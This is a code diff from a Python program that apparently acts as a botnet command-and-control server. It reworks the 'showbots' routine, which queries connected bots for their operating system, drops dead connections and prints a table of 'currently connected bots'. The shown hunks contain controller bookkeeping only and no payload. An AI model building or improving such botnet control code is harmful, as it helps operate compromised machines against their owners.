@@ -202,9 +202,7 @@ def mothership():
 			quitsafely()
 
 		if 'showbots' in command:
-			x=showbots()
-			while x != 0:
- 				x=showbots()
+			showbots()
 
 
 		elif "connect" in command:
@@ -233,21 +231,25 @@ def showbots():
 			list_of_clientsocket[x].send('os'.encode())
 			clientinfo=list_of_clientsocket[x].recv(1024)
 			if clientinfo=='':
-				return 1
-			clientinfo=clientinfo.decode()
-			clientinfo=clientinfo.split('$')
+				list_of_clientsocket[x].close()
+				remove(list_of_clientsocket[x])
+
+			else:
+				clientinfo=clientinfo.decode()
+				clientinfo=clientinfo.split('$')
+				table=[x,list_of_clientaddr[x][0],list_of_clientaddr[x][1]]
+				table.extend(clientinfo)
+				bottable.add_row(table)
+
 		except:
 			list_of_clientsocket[x].close()
 			remove(list_of_clientsocket[x])
-			return 1
-		table=[x,list_of_clientaddr[x][0],list_of_clientaddr[x][1]]
-		table.extend(clientinfo)
-		bottable.add_row(table)
+
+
 
 	print ("CURRENTLY CONNECTED BOTS")
 	print ("----------------------------")    
 	print (bottable)
-	return 0
 
 
 def clientstatus(conn,command):
